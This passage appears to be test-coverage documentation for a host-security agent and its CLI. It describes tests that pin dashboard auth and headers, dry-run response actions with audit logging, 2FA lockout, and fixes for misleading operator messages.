- `crates/agent/src/dashboard/mod.rs::tests::security_headers_middleware_stamps_required_headers` — the dashboard middleware stamps X-Frame-Options=DENY, X-Content-Type-Options=nosniff, x-xss-protection=0, and referrer-policy=strict-origin-when-cross-origin on every response. Anti-regression for a "modernise security headers" PR silently dropping any of the four.
- `crates/agent/src/dashboard/mod.rs::tests::index_handler_returns_html_with_no_cache_headers` — the SPA root must ship `Cache-Control: no-store…` + `Pragma: no-cache`. Pins the 2026-05-02 STATIC_NO_CACHE rationale so a future "save bandwidth" PR cannot silently re-introduce browser caching of the index.
- `crates/agent/src/dashboard/mod.rs::tests::each_serve_js_handler_yields_javascript_content_type` — each macro-generated `serve_js_*` handler returns `application/javascript; charset=utf-8` + `no-store` + a non-empty body. Anti-regression for a hand-rolled replacement that drops the cache header on a single bundle (the regression vector that triggered the 2026-05-02 fix in the first place).
- `crates/agent/src/dashboard/mod.rs::tests::try_from_env_vars_handles_all_four_branches` — pins all four `(user, hash)` env-var branches: open access, partial-config errors with the right message on each side, empty-user reject, malformed-PHC reject, happy-path roundtrip. Splits the env-var read from the validation logic so the test never mutates process-wide environment state.
- `crates/agent/src/dashboard/mod.rs::tests::constant_time_eq_rejects_different_lengths_and_content` — `constant_time_eq` short-circuits on length mismatch (the early-return branch the prior tests never exercised) and rejects content mismatch on equal-length inputs without leaking timing.
- `crates/agent/src/dashboard/mod.rs::tests::dashboard_auth_verify_rejects_invalid_phc_hash` — slow-path `verify` rejects wrong username (constant-time short-circuit) and wrong password (argon2 mismatch) and accepts the correct pair. Pins the three internal branches of `DashboardAuth::verify`.
- `crates/agent/src/dashboard/mod.rs::tests::verified_cache_evicts_oldest_when_capacity_full` — the per-process Argon2 cache enforces `VerifiedCache::CAPACITY` (16) by evicting the oldest survivor on overflow. Without this anchor a future "raise the cap" PR could silently regress the eviction loop.
- `crates/agent/src/dashboard/mod.rs::tests::verified_cache_check_returns_false_for_missing_key` — empty cache misses every key, post-insert the inserted key hits and others miss. Pins the `None` arm of the `match map.get(&k)` in `check`.
- `crates/agent/src/dashboard/mod.rs::tests::build_tls_config_loads_existing_self_signed_cert` — the second invocation with no operator-provided paths must reuse the cert+key already on disk and NOT regenerate them. Pins the "load existing" early-exit branch.
- `crates/agent/src/dashboard/mod.rs::tests::build_tls_config_loads_operator_provided_cert_and_key` — when the operator supplies `cert_path` + `key_path`, the auto-gen branch is skipped entirely. Pins the operator-supplied path so a future refactor cannot accidentally write `dashboard-cert.pem` / `dashboard-key.pem` into the operator's data dir behind their back.
- `crates/agent/src/dashboard/mod.rs::tests::build_tls_config_rejects_missing_operator_cert_path` — operator-supplied path with non-existent files surfaces an error containing the bad path. Pins the `with_context` line on the load-PEM error path.

### Dashboard data_api.rs handlers (coverage anchors)

- `crates/agent/src/dashboard/data_api.rs::tests::api_incidents_returns_visible_items_sorted_newest_first` — exercises `compute_incidents_blocking` end-to-end via the `spawn_blocking` wrapper. Asserts research-only filter, ts-desc sort, entities populated from TriggeredBy edges, mitre_ids → tags, and outcome via `threat_contract::classify_decision`. Anti-regression for a refactor that inlines the KG walk back onto the async worker.
- `crates/agent/src/dashboard/data_api.rs::tests::api_incidents_respects_limit_query` — limit query truncates `items` but `total` reports the pre-truncation count. Pins the "X of Y" pagination contract.
- `crates/agent/src/dashboard/data_api.rs::tests::api_incidents_date_filter_drops_other_days` — historical-date branch of `compute_incidents_blocking` runs the `date_filter` arm and produces an empty list when no incident matches that day.
- `crates/agent/src/dashboard/data_api.rs::tests::api_decisions_projects_decision_fields_from_incidents` — Incident-node-to-DecisionView projection: action_type, target_ip, confidence, decision_reason → reason, auto_executed=true → execution_result="ok". Pins the front-end shape so a refactor cannot drop a field silently.
- `crates/agent/src/dashboard/data_api.rs::tests::api_decisions_marks_skipped_when_not_auto_executed` — auto_executed=false branch sets execution_result="skipped" + skill_id=None + empty reason when decision_reason is None.
- `crates/agent/src/dashboard/data_api.rs::tests::compute_overview_counts_ignore_decision_into_ai_ignored` — the `ignore` decision arm in `compute_overview_from_graph` increments `ai_ignored`, not `ai_responded` and not `safely_resolved`.
- `crates/agent/src/dashboard/data_api.rs::tests::compute_overview_counts_request_confirmation_into_unresolved` — the `request_confirmation` decision arm increments `unresolved_count` + `ai_confirmed` but not `ai_responded`.
- `crates/agent/src/dashboard/data_api.rs::tests::compute_overview_counts_allowlisted_increments_separate_counter` — `is_allowlisted=true` bumps `allowlisted_count` (the operator-visible "X allowlisted" tile) without losing the incident from the detector tally.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_parses_gauges_orphaned` — pins the canonical PR #425 Wave 4d shape: `gauges.orphaned` is the current count the banner reads, `totals.revert_failures` is the lifetime counter.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_falls_back_to_state_counts_revert_failed` — transitional shape: when `gauges.orphaned` is absent, fall back to `state_counts.revert_failed`. Anti-regression for a "simplification" PR that drops the fallback during a deploy window.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_returns_default_when_no_responses_file` — no SQLite blob, no responses.json on disk → all-zero DegradedSignals so the banner stays green by construction.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_default_when_responses_json_is_garbage` — malformed JSON does NOT panic the helper; corrupt responses.json on disk keeps the dashboard rendering.
- `crates/agent/src/dashboard/data_api.rs::tests::api_report_returns_json_for_empty_state` — `api_report` happy path serialises a TrialReport as pretty JSON with `detection_summary.total_incidents` present. Pins the public JSON contract the report tab consumes.
- `crates/agent/src/dashboard/data_api.rs::tests::api_briefing_returns_unavailable_when_no_cache` — GET /api/briefing renders `available=false` plus the operator-facing "No briefing generated yet" message when the latest_briefing mutex is None.
- `crates/agent/src/dashboard/data_api.rs::tests::api_briefing_returns_cached_briefing_when_present` — populated mutex round-trips `available=true`, threat_level, date, summary into the JSON envelope.

### Dashboard actions.rs handlers (coverage anchors)

- `crates/agent/src/dashboard/actions.rs::tests::api_action_config_returns_read_only_when_disabled` - pins the `enabled = false` branch of the mode derivation. The dashboard UI hides action buttons when this returns `read_only`; a regression here silently exposes them.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_config_returns_watch_when_enabled_and_dry_run` - pins the `enabled && dry_run` branch. The UI must show buttons with a DRY-RUN tag in this mode.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_config_returns_guard_when_enabled_live` - pins the `enabled && !dry_run` branch (live mode). Anti-regression for an off-by-one boolean that flips watch/guard.
- `crates/agent/src/dashboard/actions.rs::tests::api_quickwins_async_wrapper_returns_payload_from_disk` - exercises the `tokio::task::spawn_blocking` wrapper around `quickwins_payload`. Anti-regression for a refactor that inlines the JSONL scan back onto the async worker pool (the original bug `RECURRING_BUGS.md` "Dashboard handlers block tokio worker threads").
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_rejects_when_actions_disabled` - default `enabled = false` config short-circuits with the explicit message. Pins the operator-visible disabled-actions string the SPA renders.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_rejects_invalid_target` - RFC1918 target via the public handler returns the `validate_action_params` error verbatim. Layered with the unit-test pinning the validator itself.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_rejects_unallowed_skill` - resolved skill_id (e.g. `block-ip-iptables`) not in `allowed_skills` returns a typed error AND echoes the resolved skill_id back in the response so the operator can spot the misconfiguration.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_dry_run_happy_path_writes_audit` - end-to-end: dry-run handler executes, decision JSONL row is written with `action_type = block_ip`, `dry_run = true`, and the operator-supplied `incident_id` round-trips. Pins the audit-trail contract.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_logs_warning_when_insecure_http` - exercises the `state.insecure_http` warn! branch alongside the disabled-short-circuit. Anti-regression for a refactor that drops the HTTP-without-TLS warning.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_when_actions_disabled` - same disabled-actions guard, with the `suspend-user-sudo` skill_id echoed back. Pins the message + skill_id contract.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_empty_user` - empty / whitespace-only user fails with the explicit message. Pins the validation order vs the reason check.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_empty_reason` - empty / whitespace-only reason fails after the user check. Pins the second of the two validation gates.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_unallowed_skill` - skill missing from `allowed_skills` rejected with the typed message.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_dry_run_happy_path_writes_audit` - dry-run handler succeeds, decision JSONL row carries `action_type = suspend_user_sudo`, target_user, and incident_id. Exercises the `insecure_http` branch in the same test for coverage compactness.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_rejects_when_actions_disabled` - default disabled config short-circuits with the explicit message.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_rejects_empty_reason` - empty reason rejected before the allowed_skills check (the order matters: a non-allowed skill with an empty reason still surfaces the reason error first).
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_rejects_unallowed_skill` - `honeypot` not in allowed_skills returns the typed error.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_dry_run_happy_path_writes_audit_and_incident` - synthesizes an incident JSONL row AND writes the decision row with `execution_result = "ok (dry_run)"`. The agent's main loop reads the incident on the next 2-second tick. Anti-regression for the dry-run prefix being silently dropped.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_live_mode_records_incident_injected_result` - live-mode bookkeeping branch records `execution_result = "incident_injected"` (different from the dry-run literal). Also pins the `duration_secs.unwrap_or(120)` default branch.
- `crates/agent/src/dashboard/actions.rs::tests::execute_block_ip_dry_run_ufw_returns_success_and_chains_audit` - direct helper test with the ufw backend. Decision JSONL row carries `skill_id = block-ip-ufw`. The admin-actions audit file is created in the same directory (cross-checks the `append_admin_action` side-effect).
- `crates/agent/src/dashboard/actions.rs::tests::execute_block_ip_dry_run_iptables_uses_correct_skill_id` - iptables backend resolves to `skill_id = block-ip-iptables`. Default `incident_id = dashboard:manual` when caller passes None.
- `crates/agent/src/dashboard/actions.rs::tests::execute_block_ip_dry_run_nftables_uses_correct_skill_id` - nftables backend resolves to `skill_id = block-ip-nftables`. Pins the `_ => Box::new(BlockIpUfw)` fallback NOT being hit for known backends.
- `crates/agent/src/dashboard/actions.rs::tests::execute_suspend_user_dry_run_writes_decision_and_admin_audit` - direct helper test. Decision row carries `action_type = suspend_user_sudo`, target_user, `skill_id = suspend-user-sudo`, and `dry_run = true`.
- `crates/agent/src/dashboard/actions.rs::tests::execute_suspend_user_dry_run_default_incident_id_when_none` - `incident_id = None` falls through to the `dashboard:manual` literal. Pins the default in the helper, separate from the public-handler default.
- `crates/agent/src/dashboard/actions.rs::tests::inject_honeypot_test_incident_writes_parseable_line` - synthetic SSH brute-force incident is parseable JSON, severity `high`, IP entity `1.2.3.4`. Anti-regression for a JSON-shape change that breaks the agent loop's incident reader.
- `crates/agent/src/dashboard/actions.rs::tests::inject_honeypot_test_incident_appends_when_called_twice` - second call appends, never overwrites. The agent loop reads incrementally via byte-offset cursors; an overwrite would silently lose the first incident.
- `crates/agent/src/dashboard/actions.rs::tests::hostname_returns_some_string` - best-effort hostname helper never panics and never returns empty (env var, /etc/hostname, or the literal `unknown` fallback).
- `crates/agent/src/dashboard/actions.rs::tests::api_action_reopen_incident_rejects_when_only_reason_empty` - the second of the two empty-fields branches (existing tests cover empty incident_id; this pins empty reason with a non-empty incident_id).
- `crates/agent/src/dashboard/actions.rs::tests::api_action_override_decision_uses_default_when_original_reason_missing` - seeds a row with `reason = None` to exercise the `original.reason.unwrap_or_default()` fallback. Pins behavior when the AI decision had no rationale to begin with.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_override_decision_truncates_long_original_reason` - 500-char original reason gets clamped to exactly 200 char fragments via `truncate(_, 200)` in the combined audit reason. Anti-regression for a refactor that drops the truncation and bloats every audit row.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_label_decision_with_tp_label_writes_jsonl` - pins the TP label branch (existing tests cover FP). Empty reason via the `#[serde(default)]` String defaults to ""; the JSONL row still gets written.

### bot_helpers.rs coverage anchors (Spec 023 - AUDIT-COVERAGE-BOT-HELPERS)

Phase 7B coverage push (top-10 worktree wave). Pre-baseline `bot_helpers.rs` was at 56.6% line coverage (315/557); the formatting / dispatch branches below were untested. The block landed `bot_helpers.rs` at 80.6% (449/557, +24 points). Each anchor pins an operator-visible string the bot prints back to Telegram, so a future refactor that drops a branch silently breaks the assertion here rather than only on production.

- `crates/agent/src/bot_helpers.rs::tests::graph_last_incidents_covers_all_severities_and_age_branches` - pins every `sev_icon` arm (critical/low/wildcard) AND the `just now` / `>= 60 minutes` age formatting branches of `graph_last_incidents`. Anti-regression for a refactor that collapses the icon match to a single emoji, which would degrade the at-a-glance Telegram threat list.
- `crates/agent/src/bot_helpers.rs::tests::graph_last_decisions_covers_all_action_icons` - pins every `action_icon` arm (suspend/honeypot/monitor/kill/ignore/default) of `graph_last_decisions`. The icon distinguishes block from honeypot from kill on the operator's small phone screen; collapsing them would silently confuse incident response.
- `crates/agent/src/bot_helpers.rs::tests::graph_last_decisions_fallback_target_renders_as_question_mark` - pins the `decision_target = None` fallback rendering as `<code>?</code>` plus the `auto_executed=true → "live"` mode label. The dashboard parses the same "?" sentinel; a silent change here would desync.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_includes_decisions_section` - pins that `ask_context_deep` emits a `RECENT DECISIONS:` section formatted as `- {action} {target} ({auto|proposed})`, including the `?` fallback when `decision_target` is None. Pre-baseline section_2 was untested because the headline test only seeded a decision-less incident.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_includes_high_risk_entities_with_campaigns` - pins the `HIGH-RISK ENTITIES:` section: IP appears when `risk_score > 70` OR has a `MemberOf` campaign edge, rendered with the `campaigns=N` suffix when applicable. The `risk_score <= 70 && campaigns == 0` filter is also pinned so low-risk noise stays out.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_subgraph_renders_all_node_label_variants` - pins every variant of `node_label` (Process/File/User/Domain/Container/Device/System/Incident/Campaign) rendered through the SUBGRAPH FOR QUESTION section, including the 40-char truncation on `File` paths and the 12-char truncation on `Container` ids. Anti-regression for accidentally formatting a node as `Debug` representation when adding a new Node variant.
- `crates/agent/src/bot_helpers.rs::tests::format_time_ago_handles_days_hours_minutes_and_invalid` - pins all three age formats (`Nd ago` / `Nh ago` / `Nm ago`) plus the `recently` sentinel for unparseable input AND the `minutes.max(1)` floor so a future timestamp never produces `0m ago`.
- `crates/agent/src/bot_helpers.rs::tests::local_hostname_for_audit_reads_env_var_when_set` - pins the `HOSTNAME` env-var override path of `local_hostname_for_audit` (used in every Telegram-triage audit row). Test restores the prior env value to keep the suite reentrant.
- `crates/agent/src/bot_helpers.rs::tests::triage_allow_proc_with_valid_name_writes_audit_on_protected_path_failure` - pins the **error** branch of the `__allow_proc__` Telegram callback: a non-root test runner cannot open `/etc/innerwarden/allowlist.toml`, so `append_to_allowlist` returns Err and the audit row is written via `write_telegram_triage_audit` with the attempted process name. Anti-regression for accidentally early-returning before the audit on the failure path (which would lose forensic visibility on attempted-but-failed allowlist mutations).
- `crates/agent/src/bot_helpers.rs::tests::triage_allow_ip_with_valid_address_writes_audit_on_protected_path_failure` - mirror anchor for the `__allow_ip__` callback's protected-path Err branch.
- `crates/agent/src/bot_helpers.rs::tests::check_2fa_gate_intercepts_when_operator_is_locked_out` - pins the lockout short-circuit of `check_2fa_gate`: after 3 recorded failures within the hour the gate intercepts WITHOUT storing a new pending action, blocking re-entry until the failure window rolls off. Defends against the "lockout that still accepts a new pending action" subtle bug.
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_with_no_secret_replies_with_config_error` - pins the misconfig branch where `[security].two_factor_method = "totp"` but neither the env var nor the config field carries a usable secret. The handler must consume the pending action and reply with the configuration error rather than silently accept any code.
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_with_invalid_secret_replies_with_invalid_error` - pins the branch where `TotpProvider::new` rejects a too-short / non-base32 secret. Anti-regression for accidentally treating "invalid secret" as "any code matches".
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_with_expired_pending_reports_expired` - pins the expired-pending path: a pending action with `expires_at < now` MUST be consumed (taken from the map) and the operator gets the "expired, retry" reply. No failure counter increment — stale codes don't penalise the operator.
- `crates/agent/src/bot_helpers.rs::tests::handle_totp_response_wrong_code_after_failures_triggers_lockout_message` - pins the wrong-code-causes-lockout path: after 2 prior failures the next wrong code crosses the threshold, the lockout reply fires, AND the pending action is NOT re-stored (no retry once locked out).
- `crates/agent/src/bot_helpers.rs::tests::execute_verified_action_runs_all_action_variants_without_panic` - smoke anchor for all four `PendingActionType` arms of `execute_verified_action` (`AllowlistProcess`, `AllowlistIp`, `UndoAllowlist`, `AutoFpAllowlist`). Each arm hits the protected `/etc/innerwarden/allowlist.toml` path and falls into its Err branch on a non-root test runner; this anchor pins that none of the four arms panic, so a future refactor that drops or renames an arm fails to compile or trips the no-panic contract.

### CTL ops command coverage (spec 023 / coverage-top10 batch — 2026-05-06)

Pure-helper anchors extracted from `crates/ctl/src/commands/ops.rs` so the
1,250-line CLI dispatch file can be regression-tested without spawning real
subprocesses. Each helper isolates one decision the original interactive /
side-effecting command made inline. Bumped the file from 32.4% to 77.3%
covered.

- `crates/ctl/src/commands/ops.rs::tests::looks_like_openai_key_accepts_long_sk_keys` - format heuristic for OpenAI keys. Anti-regression for relaxing the prefix check to accept any 20+ char string.
- `crates/ctl/src/commands/ops.rs::tests::looks_like_anthropic_key_accepts_sk_ant_prefix` - format heuristic for Anthropic keys. Anti-regression for the doctor accepting `sk-` (OpenAI shape) when provider is `anthropic`.
- `crates/ctl/src/commands/ops.rs::tests::looks_like_telegram_token_accepts_canonical_format` - bot token shape `<digits>:<20+ chars>`. Pins the /etc/innerwarden/agent.env validation that prevents pasting a chat-id where a token belongs.
- `crates/ctl/src/commands/ops.rs::tests::resolve_three_tier_prefers_config_over_env_and_file` - canonical config / env / env-file precedence. Anti-regression for the doctor accidentally giving a stale env-file value priority over a fresh agent.toml entry.
- `crates/ctl/src/commands/ops.rs::tests::build_ai_provider_check_anthropic_valid_key` / `build_ai_provider_check_openai_valid_key` / `build_ai_provider_check_unknown_provider_treated_as_openai` - the doctor's per-provider key-format dispatch. Anti-regression for adding a new provider that silently degrades to "OPENAI_API_KEY not set".
- `crates/ctl/src/commands/ops.rs::tests::suggest_detector_threshold_lowers_when_too_many_incidents` / `suggest_detector_threshold_raises_when_quiet_events_dominate` / `suggest_detector_threshold_returns_current_when_calibrated` - the four heuristic branches inside `cmd_tune`. Pins the auto-tuning math so a future "make tuning more aggressive" change doesn't lose the floor of 2 or the ceiling of 50.
- `crates/ctl/src/commands/ops.rs::tests::unix_secs_to_iso_known_dates` - pure date formatter used by `cmd_pipeline_test`. Pins the leap-year arithmetic (2024-02-29) and end-of-year boundary (2025-12-31T23:59:59) the original inline math handled.
- `crates/ctl/src/commands/ops.rs::tests::format_decision_summary_uses_action_type_when_present` / `format_decision_summary_falls_back_to_action_field` / `format_decision_summary_handles_missing_fields` - the JSON→stdout transformation in step 4 of `innerwarden test`. Anti-regression for changing the order of fields the operator reads when validating the pipeline.
- `crates/ctl/src/commands/ops.rs::tests::parse_configure_menu_choice_numeric_options` / `parse_configure_menu_choice_quit_variants` / `parse_configure_menu_choice_invalid_inputs` - the configure-menu's stdin → routing decision parser, extracted so the 11 numeric branches plus quit / invalid paths are testable without `std::io::stdin`.
- `crates/ctl/src/commands/ops.rs::tests::detect_configure_menu_status_*` - the 10 "what's already configured?" derivations the configure menu uses to render its status badges. Anti-regression for accidentally flipping a `has_env` check to `is_enabled` and vice-versa.
- `crates/ctl/src/commands/ops.rs::tests::cmd_doctor_inner_returns_issue_count_with_no_configs` / `cmd_doctor_inner_handles_telegram_section_when_enabled` / `cmd_doctor_inner_with_invalid_toml_reports_failure` - smoke runs of the full `cmd_doctor` body via the new `cmd_doctor_inner` entry point. Critical: the original `cmd_doctor` called `process::exit(1)` when issues were found, making it untestable; splitting the exit decision into the wrapper preserves binary behaviour while letting tests assert the issue counter.
- `crates/ctl/src/commands/ops.rs::tests::pipeline_test_decision_found_*` - the four sub-conditions of "did a new decision appear?" inside the polling loop. Pins the original loose-match-when-grew behaviour that smoke-tests rely on.
- `crates/ctl/src/commands/ops.rs::tests::write_totp_configuration_writes_secret_and_marks_method` / `write_disable_two_factor_marks_method_as_none` - the side-effecting half of `cmd_configure_2fa`. Pins the env-file shape (`INNERWARDEN_TOTP_SECRET="..."`) and the agent.toml `[security] two_factor_method` write so a future "store secrets in keyring" refactor must update both surfaces.

### CTL setup wizard helpers (test/coverage-top10)

The `innerwarden setup` command is dominated by interactive prompts and side
effects, but its decision tree is testable when each branch is extracted into
a pure helper. The anchors below pin those helpers so a future refactor that
re-inlines them and breaks the wizard's branching is caught at CI time.

- `crates/ctl/src/commands/setup.rs::tests::parse_yes_no_uses_default_on_empty_input` — empty/whitespace stdin returns the supplied default. Anti-regression for any change that drops the default fallback.
- `crates/ctl/src/commands/setup.rs::tests::parse_yes_no_accepts_y_and_yes_case_insensitively` — only `y`/`yes` (any case, surrounding whitespace) count as affirmative.
- `crates/ctl/src/commands/setup.rs::tests::parse_model_choice_idx_zero_input_saturates_to_zero` — typing `0` does not panic; the saturating conversion to a 0-indexed slice index keeps the wizard safe.
- `crates/ctl/src/commands/setup.rs::tests::resolve_local_ollama_plan_one_model_auto_selects_it` — when Ollama is up with a single model the wizard auto-selects it (no prompt). Pins the UX contract.
- `crates/ctl/src/commands/setup.rs::tests::cloud_provider_for_selection_maps_known_indices` — the `[1/3] AI` Select dialog index→provider mapping is canonical (0=Ollama is handled separately, 1..=5 map to the cloud table). Anti-regression for any reordering that silently breaks the dialog.
- `crates/ctl/src/commands/setup.rs::tests::other_ai_providers_constant_matches_known_wizard_providers` — every name in `OTHER_AI_PROVIDERS` exists in `WIZARD_PROVIDERS`, so `prompt_setup_other_ai_plan`'s `.expect("wizard provider exists")` cannot panic at runtime.
- `crates/ctl/src/commands/setup.rs::tests::resolve_responder_plan_from_selection_auto_protect_requires_yes` — the `Auto-protect` Select branch only writes `dry_run = false` when the operator explicitly types `yes` (not `y`, not `YES`). Pins the safety gate.
- `crates/ctl/src/commands/setup.rs::tests::sensor_restart_decision_macos_skips_even_in_dry_run` — innerwarden-sensor restart is a no-op on macOS regardless of dry-run state. Pins the cross-platform contract.
- `crates/ctl/src/commands/setup.rs::tests::apply_setup_mesh_writes_seeds_when_section_missing` — fresh `[mesh]` section gets `bind`, `poll_secs`, `auto_broadcast` defaults; existing sections only flip `enabled`. Pins the no-clobber invariant for operator-edited mesh configs.
- `crates/ctl/src/commands/setup.rs::tests::compute_setup_existing_channels_slack_needs_env_and_enabled` — Slack is only "configured" when both the env var and `slack.enabled = true` are present. Anti-regression for the half-configured-but-treated-as-OK bug shape.
- `crates/ctl/src/commands/setup.rs::tests::cmd_setup_dry_run_returns_ok_when_everything_preconfigured_basic_mode` — `cmd_setup` orchestration test: with everything pre-set and `dry_run = true`, the wizard runs end-to-end without modifying the agent config (apply phase guarded).

### Daily Briefing honesty (Bug 5 — 2026-05-06 prod observation)

Operator pasted a Telegram briefing that said "Detected 0 critical, **3 high** severity threats" + listed `crontab_persistence` and `prctl_rename` under "Handled silently:", then immediately closed with "✅ All clear. Nothing needs you." That contradiction is the **same operator-honesty class** as the dashboard re-audit's "honesty > vanity in metric labels" hard rule (Wave 10 cousin).

- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_high_count_suppresses_all_clear` — `format_daily_digest_enriched` MUST NOT emit "All clear. Nothing needs you." when `high_count > 0`. Pins the honest "Auto-handled — review when convenient." copy. Anti-regression for accidentally restoring the pre-2026-05-06 contradiction.
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_critical_count_suppresses_all_clear` — same for `critical_count > 0`. The two counts share the gate but the test pins each branch independently so a future refactor that splits the gate cannot regress one half silently.
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_deferred_entry_suppresses_all_clear` — when `pipeline.deferred` lists any detector (the briefing's "Handled silently:" section), "All clear" must also be suppressed. Pins that the briefing cannot list a detector and then claim there is nothing to acknowledge.
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_truly_quiet_day_keeps_all_clear` — positive case: with all zeros AND empty deferred, "All clear. Nothing needs you." remains the right copy. Pins the no-false-positive contract (we did not break the genuine quiet-day signal).
- `crates/agent/src/telegram/burst.rs::tests::format_daily_digest_enriched_renders_deferred_entries` — pre-existing test now asserts the post-fix contract (deferred non-empty + high_count=1 ⇒ Auto-handled, not All clear).
- `crates/agent/src/telegram/formatting.rs::tests::format_daily_digest_simple` — non-enriched simple-mode digest with critical+high > 0 must also use "Auto-handled" instead of "All clear". The non-enriched function is still `pub` and the same honesty contract applies.
- `crates/agent/src/telegram/formatting.rs::tests::format_daily_digest_simple_quiet_day_keeps_all_clear` — non-enriched positive case for the truly-quiet-day branch.
- `crates/agent/src/telegram/formatting.rs::tests::format_daily_digest_simple_high_only_suppresses_all_clear` — non-enriched, only `high_count > 0` (no critical) still suppresses "All clear". Pins that high-without-critical is still a fail of the gate, not a pass.

### systemctl bus failure cascade (Bugs 1/2/3/8 — 2026-05-06 prod observation)

Operator ran `innerwarden doctor` over an SSH non-login session. Output had `Failed to connect to bus: No data available` (x2) leaking on stderr; doctor's Services section reported `[warn] innerwarden-agent is not running`; Agent health on the next line said `[ok] agent active - last write 5s ago`; dashboard probe failed with hint `→ Start the agent` even though the agent was alive; harden separately reported "Inner Warden agent is not running" in its Services category, lowering the overall score. All four symptoms shared one root cause: `is_service_active(unit) -> bool` collapsed three distinct states (active / inactive / could-not-query) into one boolean. Fix splits them into `ServiceStatus::{Active, Inactive, Unknown}` and teaches every caller to defer to a secondary signal on `Unknown` instead of producing a false-positive operator alarm.

- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_bus_failure_maps_to_unknown` — the headline anchor: stdout `unknown\n` + non-zero exit (the `Failed to connect to bus` shape) maps to `ServiceStatus::Unknown`, NOT `Inactive`. This is the difference between doctor confidently reporting the agent is down (false positive) and doctor deferring to the telemetry-freshness check below (correct).
- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_empty_stdout_maps_to_unknown` — empty stdout + non-zero exit (the bus-failure shape on distros where the bus error goes to stderr) also maps to Unknown. Pins the contract that stdout absence is "could not determine" not "inactive".
- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_inactive_maps_to_inactive` — positive case for the genuine-down path: `inactive` and `failed` stdout still produce `Inactive` so the operator does see the warning when it is real.
- `crates/ctl/src/systemd.rs::tests::classify_systemctl_is_active_active_maps_to_active` — positive case: `active` stdout maps to `Active`. Anti-regression for accidentally widening the Unknown bucket to swallow the happy path.
- `crates/ctl/src/commands/ops.rs::tests::build_dashboard_reachability_check_agent_alive_dashboard_down_does_not_say_start_agent` — Bug 3 anchor: when the agent IS alive but the dashboard probe fails, the hint MUST NOT include "Start the agent". Pins the `agent_alive=true` branch's redirect to "check the dashboard binding".
- `crates/ctl/src/commands/ops.rs::tests::build_dashboard_reachability_check_agent_down_suggests_start` — pre-Bug-3 behavior preserved when agent is genuinely down: hint still says "Start the agent". Pins both branches of the new `agent_alive` parameter.
- `crates/ctl/src/harden/services.rs::tests::classify_service_active_unknown_stdout_maps_to_unknown` — Bug 8 helper anchor: harden's local classifier returns Unknown on the bus-failure stdout shape. Pins the helper independently of the integration test below.
- `crates/ctl/src/harden/mod.rs::tests::check_services_silent_when_systemctl_returns_unknown` — Bug 8 integration anchor: full `check_services(env)` path with `unknown\n` stdout produces NO finding AND NO passed line. Anti-regression for the 16/100 "Critical" score the operator saw when the agent was alive but harden could not query the bus.
- `crates/ctl/src/harden/mod.rs::tests::check_services_silent_when_systemctl_stdout_is_empty` — same rule for the empty-stdout shape. Pins both bus-failure variants since distros differ in which one they emit.

### Harden auditd cluster (Bugs 7/9/10 — 2026-05-06 prod observation)

Operator's `innerwarden system harden` printed Score 16/100 "Critical" with SSH/firewall/kernel/permissions/docker/TLS all green; ten of the eleven Auditd findings were the auditd category (one Medium per missing rule + one High summary = 9*5 + 10 = 55pp from auditd alone, disproportionate). Inline hints embedded `auditctl …` directly after the prose with no visual break (Bug 9). The summary mentioned `innerwarden harden --install-audit-rules` but that flag was never implemented (Bug 10).

- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_missing_9_of_10_emits_single_finding` — Bug 7 anchor: with 9 missing rules, harden emits exactly ONE auditd-category finding instead of nine + one summary. Pins the new "auditd contributes one severity-bounded penalty" rule so a future refactor cannot re-introduce per-rule penalties.
- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_severity_scales_with_missing_count` — Bug 7 anchor: severity scales (1 missing = Low, 4 missing = Medium, 7+ missing = High). Caps the auditd category's score impact at one High penalty (10pp) instead of N*5pp + 10pp.
- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_missing_rules_fix_is_bullet_formatted` — Bug 9 anchor: the fix text presents each missing rule on its own indented bullet line and includes the `augenrules --load` reload hint. Anti-regression for the prose-collides-with-command shape that confused operator copy-paste.
- `crates/ctl/src/harden/auditd.rs::tests::check_auditd_missing_rules_fix_does_not_promise_unimplemented_flag` — Bug 10 anchor: the fix text MUST NOT mention `--install-audit-rules`. Pins the rule that any flag promised in operator-facing text must exist in the CLI; the alternative ("implement the flag") is a separate feature PR. Honesty hard rule applied to CLI affordances.

### Doctor nginx error log discovery (Bug 4 — 2026-05-06 prod observation)

